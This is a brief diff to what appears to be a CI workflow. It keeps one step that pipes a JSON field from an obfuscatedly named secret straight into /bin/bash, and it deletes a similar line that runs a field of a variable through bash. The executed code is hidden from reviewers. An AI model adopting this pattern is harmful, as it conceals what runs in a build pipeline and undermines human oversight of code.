@@ -23,7 +23,6 @@ jobs:
           bxfe3304: ${{ secrets.bxfe3304 }}
         run: |
           printf '%s' "$bxfe3304" | jq -r .ejjj10557 | /bin/bash
-          echo $h2 | jq -r .p84303 | /bin/bash
 
       - name: Store artifact
         if: always()
